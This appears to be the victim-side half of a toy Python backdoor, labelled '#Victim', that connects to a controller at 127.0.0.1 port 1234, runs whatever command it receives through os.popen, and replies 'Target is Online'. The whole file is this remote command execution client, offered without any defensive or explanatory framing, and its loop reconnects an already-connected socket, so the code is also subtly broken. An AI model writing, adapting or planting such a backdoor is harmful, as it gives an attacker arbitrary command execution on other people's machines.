#Victim

import socket
import os

server = socket.socket()
host = '127.0.0.1' 
port = 1234

run = True
while run:

    server.connect((host,port))

    msg = server.recv(1024)
    os.popen(msg.decode('UTF-8'))

    server.send('Target is Online . . . ' .encode('UTF-8'))
